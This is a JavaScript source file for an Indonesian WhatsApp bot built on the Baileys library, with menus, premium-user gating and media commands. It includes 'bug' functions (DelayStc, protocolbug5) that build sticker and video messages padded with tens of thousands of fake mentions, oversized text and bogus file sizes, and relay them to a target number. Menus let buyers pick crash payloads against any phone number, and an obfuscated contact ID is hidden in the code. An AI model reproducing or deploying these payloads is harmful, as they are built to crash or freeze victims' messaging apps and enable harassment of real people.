/**
 * kayzen ish here
*/

require('./config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const crypto = require('crypto');
const { SnackVideo } = require('./lib/function/snackvideo')
const yts = require('yt-search');
const { getVideoInfo, downloadVideo, downloadAudio } =require("hybrid-ytdl");
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const {
    spawn, 
    exec,
    webp2mp4File,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

module.exports = Kayzen = async (Kayzen, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        
        const sender = m.key.fromMe ? Kayzen.user.id.split(":")[0] + "@s.whatsapp.net" || Kayzen.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        
        const premium = JSON.parse(fs.readFileSync("./lib/database/premium.json"))
        const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'));
        const botNumber = await Kayzen.decodeJid(Kayzen.user.id);
        const IsXavier = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const SlncKayzen = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const isPremium = premium.includes(m.sender)
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await Kayzen.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6282295954278:+62 822-9595-4278\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
        const reply = (teks) => {
Kayzen.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 999,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${global.namaBot}`,
"body": `${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://files.catbox.moe/j5trse.jpg',
"sourceUrl": 'https://whatsapp.com/channel/0029VbBEcuJGOj9vBQQNIq1u'}}},
{ quoted: qkontak})
}
        const {
            smsg,
            fetchJson, 
            sleep,
            formatSize
            } = require('./lib/myfunction');
             //theme sticker reply
        const Kayzenwet = () => {
        let KayzenStikRep = fs.readFileSync('./lib/sticker_reply/wait.webp')
        Kayzen.sendMessage(from, { sticker: KayzenStikRep }, { quoted: m })
        }
        const Kayzenadmn = () => {
        let KayzenStikRep = fs.readFileSync('./lib/sticker_reply/admin.webp')
        Kayzen.sendMessage(from, { sticker: KayzenStikRep }, { quoted: m })
        }
        const Kayzenbotadmin = () => {
        let KayzenStikRep = fs.readFileSync('./lib/sticker_reply/botadmin.webp')
        Kayzen.sendMessage(from, { sticker: KayzenStikRep }, { quoted: m })
        }
        const Kayzenowner = () => {
        let KayzenStikRep = fs.readFileSync('./lib/sticker_reply/owner.webp')
        Kayzen.sendMessage(from, { sticker: KayzenStikRep }, { quoted: m })
        }
        const Kayzenongb = () => {
        let KayzenStikRep = fs.readFileSync('./lib/sticker_reply/group.webp')
        Kayzen.sendMessage(from, { sticker: KayzenStikRep }, { quoted: m })
        }
        const Kayzenpriv = () => {
        let KayzenStikRep = fs.readFileSync('./lib/sticker_reply/prem.webp')
        Kayzen.sendMessage(from, { sticker: KayzenStikRep }, { quoted: m })
        }
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#00FF00").black(
                    `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ⌬ Pesan: ${m.body || m.mtype} \n` +
                    `   ⌬ Pengirim: ${pushname} \n` +
                    `   ⌬ JID: ${senderNumber}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#00FF00").black(
                        `   ⌬ Grup: ${groupName} \n` +
                        `   ⌬ GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        
        const reaction = async (jidss, emoji) => {
            Kayzen.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
/////// AWAL FUNC /////////
async function DelayStc(lezz, isTarget) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: isTarget,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: "9999999999",
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: "9999999999",
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await lezz.relayMessage(isTarget, stickerMsg.message, { messageId: stickerMsg.key.id });
}

async function protocolbug5(isTarget, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    }; 

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await kayzen.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await kayzen.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function DelayStc(kayzen, isTarget) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: isTarget,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await kayzen.relayMessage(isTarget, stickerMsg.message, { messageId: stickerMsg.key.id });
}
// LAST FUNC //
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(res.data);
}

        
        async function loading() {
    return reply("Sedang memuat Wak...");
}
        

        switch (command) {
                case "menu": {
        let menu = `*ʜᴀʟʟᴏ ${pushname}.*  ɴᴀᴍᴀ ꜱᴀʏᴀ ᴀᴅᴀʟᴀʜ *${namaBot}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaowner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

┏═━ \`カイゼン・ザビエル \` ━━
║◦ɴᴀᴍᴀ: *${pushname}* 
║◦ɴᴏᴍᴏʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━

┏═━ \`ザビエル・ゲンツ\` ━━
║◦ɴᴀᴍᴀ ʙᴏᴛ: *${namaBot}*  
║◦ᴘᴇɴɢᴇᴍʙᴀɴɢ: *${namaowner}*  
║◦ᴍᴏᴅᴇ: *${Kayzen.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━ `
Kayzen.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
       document: fs.readFileSync("./package.json"),
        fileName: "You Know Xavier? Nah, It's Kayzen",
        mimetype: "application/pdf",
        fileLength: 999999999999,
        pageCount: 999,
        caption: menu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "—You Know Xavier? Nah, It's Kayzen",
                newsletterJid: `120363416935474713@newsletter`,
            },
            externalAdReply: {  
             title: namaBot,
              body: namafile,
                thumbnailUrl: thumbnail,
                sourceUrl: ch, 
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: qkontak
                    })
                    await sleep(2500)
     Kayzen.sendMessage(m.chat, {
                        audio: fs.readFileSync('./media/menu1.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: qkontak
                    })
                    }
break
            case "Kayzen":
            case "allmenu": {
    let Kay = `*ʜᴀʟʟᴏ ${pushname}.*  ɴᴀᴍᴀ ꜱᴀʏᴀ ᴀᴅᴀʟᴀʜ *${namaBot}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaowner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*
┏━━━ 香 𝚖𝚎𝚗𝚞  𝚡𝚊𝚟𝚒𝚎𝚛 香 ━━
┃私 ${prefix}xᴀᴠɪᴇʀ-ᴜɪ
┃私 ${prefix}xᴀᴠɪᴇʀ-ɪɴᴠɪs
┃私 ${prefix}xᴀᴠɪᴇʀ-ғᴏʀᴄᴇ
┗━━━━━━━⭑ 
┏━━━ 香 ザビエル 香 ━━
┃香 ${prefix}ᴘʟᴀʏ
┃香 ${prefix}ᴛɪᴋᴛᴏᴋ
┃香 ${prefix}ʀᴠᴏ
┃香 ${prefix}ᴍᴏᴅᴇ
┃香 ${prefix}ᴀᴅᴅᴘʀᴇᴍ
┃香 ${prefix}ᴅᴇʟᴘʀᴇᴍ
┃香 ${prefix}ʙʀᴀᴛ
┃香 ${prefix}sᴛɪᴄᴋᴇʀ
┃香 ${prefix}ʜɪᴅᴇᴛᴀɢ
┃香 ${prefix}ᴛᴀɢᴀʟʟ
┃香  ${prefix}sᴇʟғ
┃香 ${prefix}ᴘᴜʙʟɪᴄ
┗━━━━━━━⭑ 
`
Kayzen.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.buysc`,
      buttonText: { displayText: 'Buy Script' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Back To Menu',
                  id: '.menu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
       document: fs.readFileSync("./package.json"),
        fileName: "You Know Xavier? Nah, It's Kayzen Silence",
        mimetype: "application/pdf",
        fileLength: 999999999999,
        pageCount: 999,
        caption: Kay,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "—You Know Xavier? Nah, It's Kayzen",
                newsletterJid: `120363416935474713@newsletter`,
            },
            externalAdReply: {  
             title: namaBot,
              body: namafile,
                thumbnailUrl: thumbnail,
                sourceUrl: ch, 
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: qkontak
                    })
                    await sleep(2500)
     Kayzen.sendMessage(m.chat, {
                        audio: fs.readFileSync('./media/menu1.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: qkontak
                    })
                    }
          break
/*          case 'xavier-ui': {
if (!isPremium && !IsXavier) return reply(mess.prem)
if (!q) return reply(`Penggunaan #${command} 628×××`)
let target = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
let teks = `𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵 𝘖𝘯𝘦 𝘖𝘍 𝘛𝘩𝘦 𝘟𝘢𝘷𝘪𝘦𝘳 𝘉𝘶𝘨`
Kayzen.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: 'SCRIPT' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
            name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝘓҉𝘐҉𝘚҉𝘛҉ ҉𝘉҉𝘜҉𝘎҉ ҉𝘟҉𝘈҉𝘝҉𝘐҉𝘌҉𝘙҉҉',
          sections: [
            {
              title: '𝘓𝘪𝘴𝘵 𝘉𝘶𝘨 𝘟𝘢𝘷𝘪𝘦𝘳',
              highlight_label: 'Recommended',
              rows: [
                {
                title: '𝘜𝘐 𝘏𝘢𝘳𝘥',
                  id: `.ui-hard ${target}`
                },                
                {
                title: '𝘜𝘐 𝘔𝘦𝘥𝘪𝘶𝘮',
                  id: `.ui-medium ${target}`
                },                
                {
                title: '𝘜𝘐 𝘈𝘫𝘢',
                  id: `.ui-aja ${target}`
                },                
                {
                  title: '𝘜𝘐 𝘊𝘶𝘺',
                  id: `.ui-cuy ${target}`
                },
                {
                  title: '𝘜𝘐 𝘊𝘳𝘢𝘴𝘩',
                  id: `.ui-crash ${target}`
                },
                {
                  title: '𝘜𝘐 𝘜𝘭𝘵𝘳𝘢',
                  id: `.ui-ultra ${target}`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
      image: { url: 'https://files.catbox.moe/j5trse.jpg' },
      caption: teks,
      contextInfo: {
      externalAdReply: {
      title: namaBot,
      body: namaowner,
      thumbnailUrl: 'https://files.catbox.moe/j5trse.jpg',
      sourceUrl: ch,
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      }, {
                        quoted: qkontak
                    })
     await Kayzen.sendMessage(m.chat, {
                        audio: fs.readFileSync('./media/menu1.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: qkontak
                    })
                    }
                    break
                    case 'xavier-invis': {
if (!isPremium && !IsXavier) return reply(mess.prem)
if (!q) return reply(`Penggunaan #${command} 628×××`)
let target = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
let teks = `𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵 𝘖𝘯𝘦 𝘖𝘍 𝘛𝘩𝘦 𝘟𝘢𝘷𝘪𝘦𝘳 𝘉𝘶𝘨`
Kayzen.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: 'SCRIPT' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
            name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝘓҉𝘐҉𝘚҉𝘛҉ ҉𝘉҉𝘜҉𝘎҉ ҉𝘟҉𝘈҉𝘝҉𝘐҉𝘌҉𝘙҉҉',
          sections: [
            {
              title: '𝘓𝘪𝘴𝘵 𝘉𝘶𝘨 𝘟𝘢𝘷𝘪𝘦𝘳',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: '𝘟𝘢𝘷𝘪𝘦𝘳 𝘌𝘹𝘱𝘦𝘳𝘵',
                  id: `.xavier-expert ${target}`
                },                
                {
                title: '𝘟𝘢𝘷𝘪𝘦𝘳 𝘏𝘢𝘳𝘥',
                  id: `.xavier-hard ${target}`
                },                
                {
                  title: '𝘟𝘢𝘷𝘪𝘦𝘳 𝘔𝘦𝘥𝘪𝘶𝘮',
                  id: `.xavier-medium ${target}`
                },
                {
                title: '𝘜𝘐 𝘚𝘺𝘴𝘵𝘦𝘮',
                  id: `.ui-system ${target}`
                },
                {
                  title: '𝘜𝘐 𝘌𝘹𝘱𝘦𝘳𝘵',
                  id: `.ui-expert ${target}`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
      image: { url: 'https://files.catbox.moe/j5trse.jpg' },
      caption: teks,
      contextInfo: {
      externalAdReply: {
      title: namaBot,
      body: namaowner,
      thumbnailUrl: 'https://files.catbox.moe/j5trse.jpg',
      sourceUrl: ch,
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      }, {
                        quoted: qkontak
                    })
     await Kayzen.sendMessage(m.chat, {
                        audio: fs.readFileSync('./media/menu1.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: qkontak
                    })
                    }
                    break
case 'xavier-force': {
if (!isPremium && !IsXavier) return reply(mess.prem)
if (!q) return reply(`Penggunaan #${command} 628×××`)
let target = q.replace(/[^0-9]/g, '').trim() + "@s.whatsapp.net"
let teks = `𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵 𝘖𝘯𝘦 𝘖𝘍 𝘛𝘩𝘦 𝘟𝘢𝘷𝘪𝘦𝘳 𝘉𝘶𝘨`
Kayzen.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: 'SCRIPT' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'L҉I҉S҉T҉ ҉B҉U҉G҉ ҉X҉A҉V҉I҉E҉R҉',
          sections: [
            {
              title: '𝘓𝘪𝘴𝘵 𝘉𝘶𝘨 𝘟𝘢𝘷𝘪𝘦𝘳',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: '𝘟𝘦𝘯𝘰𝘪𝘥',
                  id: `.xenoid ${target}`
                },                
                {
                  title: '𝘋𝘳𝘦𝘢𝘮',
                  id: `.dream ${target}`
                  },
                  {
                  title: '𝘍𝘭𝘰𝘸',
                  id: `.flow ${target}`
                },                
                {
                  title: '𝘔𝘺𝘴𝘵𝘪𝘤',
                  id: `.mystic ${target}`
                },                
                {
                  title: '𝘊𝘭𝘰𝘴𝘦',
                  id: `.close ${target}`
                },
                {
                  title: '𝘝𝘰𝘭𝘤𝘢𝘯𝘪𝘤',
                  id: `.volcanic ${target}`
               }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
      image: { url: 'https://files.catbox.moe/j5trse.jpg' },
      caption: teks,
      contextInfo: {
      externalAdReply: {
      title: namaBot,
      body: namaowner,
      thumbnailUrl: 'https://files.catbox.moe/j5trse.jpg',
      sourceUrl: ch,
      mediaType: 1,
      renderLargerThumbnail: false
      }
      }
      }, {
                        quoted: qkontak
                    })
     await Kayzen.sendMessage(m.chat, {
